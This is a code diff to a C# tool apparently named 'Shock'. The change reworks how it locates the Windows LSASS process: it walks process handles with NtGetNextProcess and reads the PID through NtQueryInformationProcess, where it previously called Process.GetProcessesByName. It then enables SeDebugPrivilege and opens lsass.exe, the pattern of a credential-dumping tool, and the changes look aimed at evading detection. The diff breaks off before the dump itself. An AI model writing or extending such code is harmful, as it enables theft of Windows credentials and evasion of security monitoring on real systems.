@@ -2,7 +2,9 @@
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.Linq;
+using System.Net.NetworkInformation;
 using System.Runtime.InteropServices;
+using System.Text;
 using static Shock.NT;
 
 
@@ -267,23 +269,72 @@ namespace Shock
         }
 
 
-        static void Shock(string file_name) {
-            // Get process name
-            string procname = "lsass";
+        public static List<IntPtr> GetProcessByName(string proc_name)
+        {
+            IntPtr aux_handle = IntPtr.Zero;
+            int MAXIMUM_ALLOWED = 0x02000000;
+            List<IntPtr> handles_list = new List<IntPtr>();
 
-            //Get process PID
-            Process[] process_list = Process.GetProcessesByName(procname);
-            if (process_list.Length == 0)
+            while (!NtGetNextProcess(aux_handle, MAXIMUM_ALLOWED, 0, 0, out aux_handle))
             {
-                Console.WriteLine("[-] Process " + procname + " not found.");
-                Environment.Exit(0);
+                StringBuilder fileName = new StringBuilder(100);
+                GetProcessImageFileName(aux_handle, fileName, 100);
+                char[] stringArray = fileName.ToString().ToCharArray();
+                Array.Reverse(stringArray);
+                string reversedStr = new string(stringArray);
+                int index = reversedStr.IndexOf("\\");
+                if (index != -1)
+                {
+                    string res = reversedStr.Substring(0, index);
+                    stringArray = res.ToString().ToCharArray();
+                    Array.Reverse(stringArray);
+                    res = new string(stringArray);
+                    if (res == proc_name)
+                    {
+                        handles_list.Add(aux_handle);
+                    }
+                }
             }
-            int processPID = process_list[0].Id;
-            Console.WriteLine("[+] Process PID: \t\t\t\t" + processPID);
+            return handles_list;
+        }
 
+
+        unsafe static int get_pid(IntPtr process_handle) {
+            uint process_basic_information_size = 48;
+            int pid_offset = 0x20;
+
+            // Create byte array with the size of the PROCESS_BASIC_INFORMATION structure
+            byte[] pbi_byte_array = new byte[process_basic_information_size];
+
+            // Create a PROCESS_BASIC_INFORMATION structure in the byte array
+            IntPtr pbi_addr = IntPtr.Zero;
+            fixed (byte* p = pbi_byte_array)
+            {
+                pbi_addr = (IntPtr)p;
+
+                uint ntstatus = NtQueryInformationProcess(process_handle, 0x0, pbi_addr, process_basic_information_size, out uint ReturnLength);
+                if (ntstatus != 0)
+                {
+                    Console.WriteLine("[-] Error calling NtQueryInformationProcess. NTSTATUS: 0x" + ntstatus.ToString("X"));
+                }
+            }
+
+            // Get PEB Base Address
+            IntPtr peb_pointer = pbi_addr + pid_offset;
+            IntPtr pebaddress = Marshal.ReadIntPtr(peb_pointer);
+            return (int)pebaddress;
+        }
+
+
+        static void Shock(string file_name) {
             // Get SeDebugPrivilege
             EnableDebugPrivileges();
 
+            // Get process name
+            string proc_name = "lsass.exe";
+            IntPtr process_handle = GetProcessByName(proc_name).First();
+            int processPID = get_pid(process_handle);
+            
             // Get process handle with NtOpenProcess
             IntPtr processHandle = IntPtr.Zero;
             CLIENT_ID client_id = new CLIENT_ID();
